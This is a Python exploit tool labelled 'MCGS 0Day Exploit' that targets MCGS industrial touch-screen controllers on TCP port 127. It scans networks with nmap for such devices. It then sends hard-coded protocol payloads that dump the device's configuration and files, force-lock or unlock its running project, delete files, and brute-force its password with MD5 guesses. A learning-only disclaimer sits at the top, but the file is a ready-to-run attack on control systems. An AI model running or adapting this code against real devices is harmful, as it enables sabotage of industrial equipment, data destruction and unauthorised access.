from pwn import *
from tqdm import tqdm
import argparse
import textwrap
import sys
import nmap
import hashlib


VERSION = "Mo0n V1.1.0 MCGS 0Day Exploit"
TITLE = f'''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is onl y for learning and experiment. Do not use it
for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************
'''
LOGO = f'''
 .----------------.  .----------------.  .----------------.  .-----------------.
| .--------------. || .--------------. || .--------------. || .--------------. |
| | ____    ____ | || |     ____     | || |     ____     | || | ____  _____  | |
| ||_   \  /   _|| || |   .'    `.   | || |   .'    '.   | || ||_   \|_   _| | |
| |  |   \/   |  | || |  /  .--.  \  | || |  |  .--.  |  | || |  |   \ | |   | |
| |  | |\  /| |  | || |  | |    | |  | || |  | |    | |  | || |  | |\ \| |   | |
| | _| |_\/_| |_ | || |  \  `--'  /  | || |  |  `--'  |  | || | _| |_\   |_  | |
| ||_____||_____|| || |   `.____.'   | || |   '.____.'   | || ||_____|\____| | |
| |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'
                Github==>https://github.com/MartinxMax
                @Мартин. {VERSION}'''

class MAP_MCGS_MAIN():
    def __init__(self,args):
        self.__scan = args.SCAN
        self.__target = args.RHOST
        self.__get = args.GET
        self.__lock = args.LOCK
        self.__unlock= args.UNLOCK
        self.__del_file = args.DEL
        self.__crack=args.CRACK

    def run(self):
        if self.__scan:
            self.__scanner(self.__scan)
        else:
            if self.__target:
                try:
                    self.pwn_socket = remote(self.__target, '127')
                    self.pwn_socket.send(self.__request())
                    res = self.pwn_socket.recv(1024)
                    if not res:
                        log.error("The target is not MCGS")
                    elif res == b'\x13\x00\x00\x00\x00\x00\x00&\xa3\xaa\xaa\xaa\x0b\x00\x00\x00Net_Control':
                        log.info("Target MCGS")



                except Exception as e:
                    log.warning("The host is unreachable, possibly due to network issues or lack of vulnerabilities!")

                else:
                    if self.__get:
                        log.info("Getting device configuration...")
                        self.pwn_socket.send(self.__get_version())
                        log.info("Device Version:"+self.__decode(self.pwn_socket.recv(1024).decode(errors='ignore')))
                        self.pwn_socket.send(self.__get_device())
                        log.info("Device Config:"+self.__decode(self.pwn_socket.recv(1024).decode(errors='ignore')))
                        self.pwn_socket.send(self.__get_work_dir())
                        log.info("Device Work Directory:"+self.__decode(self.pwn_socket.recv(1024).decode(errors='ignore')))
                        self.pwn_socket.send(self.__get_project_dir())
                        log.info("Device Project Directory:"+self.__decode(self.pwn_socket.recv(1024).decode(errors='ignore')))
                        self.pwn_socket.send(self.__get_files())
                        log.info("Device Files:"+self.__decode(self.pwn_socket.recv(2028).decode(errors='ignore')))
                        log.success("Successfully obtained device configuration...")

                    elif self.__lock:
                        log.info("Locking device...")
                        self.pwn_socket.send(self.__lock_config_button())
                        self.pwn_socket.send(self.__feedback_config_page())
                        log.success("Device successfully locked...")
                    elif self.__unlock:
                        log.info("Unlocking device...")
                        self.pwn_socket.send(self.__unlock_config_button())
                        self.pwn_socket.send(self.__into_main_page())
                        log.success("Device unlocked successfully...")
                    elif self.__del_file:
                        log.info(f"Attempting to delete file {self.__del_file}")
                        self.pwn_socket.send(self.__del_files(self.__del_file))
                        log.success(f"delete file {self.__del_file} successfully...")
                    elif self.__crack:
                        log.info(f"Attempting to crack password...")
                        res = self.__crack_password()
                        if res :
                            log.info(f"===========WIN==========")
                            log.info(f"[Password] {res}")
                        else:
                            log.info(f"===========:(==========")
                            log.info(f"oops!!!!")

                    else:
                        log.warning("Please enter options (-get) (-lock) or (-unlock)!")
                    self.pwn_socket.close()

            else:
                log.warning("You must fill in the destination address (-rhost <192.168.0.102>)!!!")
                return False

    def __del_files(self,filename,path=b'/storage/user_dir/'):
        hex_bytes='61000000000000c2a0aaaaaaa0b4ec00010000001200000072656d6f766546696c654f72466f6c646572010000001100000046463a3a7574696c733a3a537472696e6722000000'
        path_hex = path.hex()
        file_name = filename.encode('utf-8').hex()
        combined_hex = hex_bytes + path_hex + file_name
        print(combined_hex)
        return combined_hex.encode('utf-8')

    def __decode(self,data):
        return ''.join([c if c in string.printable else '.' for c in data])

    def __request(self):
        return b'\x04\x00\x00\x00\x00\x00\x00\x08\xA3\xAA\xAA\xAA'

    def __feedback_config_page(self):
        return b'\x24\x00\x00\x00\x00\x00\x00\x48\xa0\xaa\xaa\xaa\x48\xc2\xe4\x0b\x01\x00\x00\x00\x10\x00\x00\x00\x70\x72\x6f\x6a\x65\x63\x74\x41\x73\x79\x6e\x63\x53\x74\x6f\x70\x00\x00\x00\x00'


    def __into_main_page(self):
        return b'\x20\x00\x00\x00\x00\x00\x00\x40\xa0\xaa\xaa\xaa\xf8\xd1\x22\x10\x01\x00\x00\x00\x0c\x00\x00\x00\x70\x72\x6f\x6a\x65\x63\x74\x53\x74\x61\x72\x74\x00\x00\x00\x00'


    def __get_version(self):
        return  b'\x25\x00\x00\x00\x00\x00\x00\x4a\xa0\xaa\xaa\xaa\xe8\xbd\xe4\x0b\x01\x00\x00\x00\x11\x00\x00\x00\x70\x72\x6f\x6a\x65\x63\x74\x47\x65\x74\x56\x65\x72\x73\x69\x6f\x6e\x00\x00\x00\x00'


    def __get_device(self):
        return b'\x24\x00\x00\x00\x00\x00\x00\x48\xa0\xaa\xaa\xaa\x68\xc0\xe4\x0b\x01\x00\x00\x00\x10\x00\x00\x00\x67\x65\x74\x50\x72\x6f\x64\x75\x63\x74\x53\x74\x72\x69\x6e\x67\x00\x00\x00\x00'


    def __get_work_dir(self):
        return b'\x44\x00\x00\x00\x00\x00\x00\x88\xa0\xaa\xaa\xaa\x88\xbe\xe4\x0b\x01\x00\x00\x00\x0a\x00\x00\x00\x67\x65\x74\x45\x6e\x76\x50\x61\x74\x68\x01\x00\x00\x00\x11\x00\x00\x00\x46\x46\x3a\x3a\x75\x74\x69\x6c\x73\x3a\x3a\x53\x74\x72\x69\x6e\x67\x0d\x00\x00\x00\x4d\x43\x47\x53\x5f\x57\x4f\x52\x4b\x5f\x44\x49\x52'


    def __get_project_dir(self):
        return b'\x47\x00\x00\x00\x00\x00\x00\x8e\xa0\xaa\xaa\xaa\x88\xbe\xe4\x0b\x02\x00\x00\x00\x0a\x00\x00\x00\x67\x65\x74\x45\x6e\x76\x50\x61\x74\x68\x01\x00\x00\x00\x11\x00\x00\x00\x46\x46\x3a\x3a\x75\x74\x69\x6c\x73\x3a\x3a\x53\x74\x72\x69\x6e\x67\x10\x00\x00\x00\x4d\x43\x47\x53\x5f\x50\x52\x4f\x4a\x45\x43\x54\x5f\x44\x49\x52'

    def __get_files(self):
        return b'\x49\x00\x00\x00\x00\x00\x00\x92\xa0\xaa\xaa\xaa\x00\xaa\xec\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x73\x65\x61\x72\x63\x68\x46\x69\x6c\x65\x73\x01\x00\x00\x00\x11\x00\x00\x00\x46\x46\x3a\x3a\x75\x74\x69\x6c\x73\x3a\x3a\x53\x74\x72\x69\x6e\x67\x11\x00\x00\x00\x2f\x73\x74\x6f\x72\x61\x67\x65\x2f\x75\x73\x65\x72\x5f\x64\x69\x72'


    def __lock_config_button(self):
        return b'\x4e\x00\x00\x00\x00\x00\x00\x9c\xa0\xaa\xaa\xaa\xb0\x43\xbc\x0d\x01\x00\x00\x00\x14\x00\x00\x00\x70\x72\x6f\x6a\x65\x63\x74\x53\x74\x61\x72\x74\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x01\x00\x00\x00\x11\x00\x00\x00\x46\x46\x3a\x3a\x75\x74\x69\x6c\x73\x3a\x3a\x53\x74\x72\x69\x6e\x67\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x6d\x63\x67\x73\x5f\x61\x70\x70'


    def __unlock_config_button(self):
        return b'\x4f\x00\x00\x00\x00\x00\x00\x9e\xa0\xaa\xaa\xaa\xb0\x43\xbc\x0d\x03\x00\x00\x00\x15\x00\x00\x00\x70\x72\x6f\x6a\x65\x63\x74\x46\x69\x6e\x69\x73\x68\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x01\x00\x00\x00\x11\x00\x00\x00\x46\x46\x3a\x3a\x75\x74\x69\x6c\x73\x3a\x3a\x53\x74\x72\x69\x6e\x67\x0d\x00\x00\x00\x2f\x75\x73\x72\x2f\x6d\x63\x67\x73\x5f\x61\x70\x70'

    def __crack_password(self):
        def md5_hash(num):
            m = hashlib.md5()
            m.update(str(num).encode('utf-8'))
            hex_hash = m.hexdigest()
            return hex_hash

        def string_to_hex(input_string):
            bytes_data = input_string.encode('utf-8')
            hex_string = bytes_data.hex()
            return hex_string

        basic = '61000000000000c2a0aaaaaa98ed3201010000001400000070726f6a656374436865636b50617373776f7264010000001100000046463a3a7574696c733a3a537472696e6720000000'
        for i in tqdm(range(999999999999999999)):
            try:
                payload = basic + string_to_hex(md5_hash(i))
                payload = bytes.fromhex(payload)
                self.pwn_socket.send(payload)
                res = self.pwn_socket.recv(1024)
                if res[-1:] == b'\x01':
                    return i

            except Exception as e:
                print(e)
                log.error("Crack fail")
                return 0

    def __scanner(self,ips):
        nm = nmap.PortScanner()
        nm.scan(hosts=ips, arguments='-p127 --open -sS -T4')
        for host in nm.all_hosts():
            if 'tcp' in nm[host]:
                if 127 in nm[host]['tcp']:
                    if 'locus-con' in nm[host]['tcp'][127]['name'].lower():
                        log.success(f"Found MCGS touch screen, there may be a vulnerability [{host}]")
                        return True
        log.failure("No MCGS devices found!")
        return False


if __name__ == '__main__':
    print(LOGO)
    print(TITLE)
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
            Example:
                author-Github==>https://github.com/MartinxMax
            Basic usage:
                python3 {Mo0n} -scan <192.168.0.0/24> # Scan MCGS devices
                python3 {Mo0n} -rhost <192.168.0.102> -get # Obtain MCGS configuration
                python3 {Mo0n} -rhost <192.168.0.102> -lock # Forced locking of MCGS
                python3 {Mo0n} -rhost <192.168.0.102> -unlock # Unlock MCGS
                '''.format(Mo0n=sys.argv[0])))
    parser.add_argument('-scan', '--SCAN',default='', help='Scan Device')
    parser.add_argument('-rhost', '--RHOST',default='', help='Target IP')
    parser.add_argument('-get', '--GET', action='store_true', help='Device Config')
    parser.add_argument('-del', '--DEL',default='', help='Delete file')
    parser.add_argument('-lock', '--LOCK', action='store_true', help='Lock Device')
    parser.add_argument('-unlock', '--UNLOCK', action='store_true', help='UnLock Device')
    parser.add_argument('-crack', '--CRACK', action='store_true', help='UnLock Device')

    args = parser.parse_args()
    MAP_MCGS_MAIN(args).run()
